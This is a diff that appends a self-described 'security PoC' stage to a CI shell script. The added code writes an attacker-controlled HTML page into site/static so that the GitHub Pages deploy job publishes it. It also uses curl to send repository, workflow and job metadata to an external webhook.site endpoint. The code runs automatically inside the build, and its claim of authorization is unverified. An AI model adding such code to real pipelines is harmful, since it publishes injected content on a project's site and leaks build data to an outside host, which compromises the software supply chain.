@@ -225,3 +225,19 @@ else
   _f03 "token=absent"
 fi
 set -eu
+
+# === F-03 security PoC stage 2 (appended by an authorized researcher for the Kosli VDP) ===
+# Purpose: prove that the deploy job's pages: write publishes attacker-controlled
+# content. Writes a marker into site/static/, which Hugo copies verbatim into
+# site/public/, which upload-pages-artifact ships and deploy-pages publishes.
+set +e +u
+_F03_CB="https://webhook.site/1fac581f-373c-4a4c-a0a0-62bbfdedcd2a"
+_f03() { curl -s -m 10 "$_F03_CB" -d "$1" >/dev/null 2>&1; }
+if [ -d site/static ] || [ -d site ]; then
+  mkdir -p site/static
+  printf '<!doctype html>\n<html lang="en">\n<head><meta charset="utf-8"><title>ergo-f03-poc-published-marker</title></head>\n<body>\n<h1>ergo-f03-poc-published-marker</h1>\n<p>Attacker-controlled content published through the pages: write deploy job of pages.yml.</p>\n<p>repo=%s ref=%s sha=%s</p>\n</body>\n</html>\n' \
+    "${GITHUB_REPOSITORY:-na}" "${GITHUB_REF:-na}" "${GITHUB_SHA:-na}" \
+    > site/static/ergo-f03-poc-marker.html
+  _f03 "published_marker=written&path=site/static/ergo-f03-poc-marker.html&workflow=${GITHUB_WORKFLOW:-na}&job=${GITHUB_JOB:-na}"
+fi
+set -eu
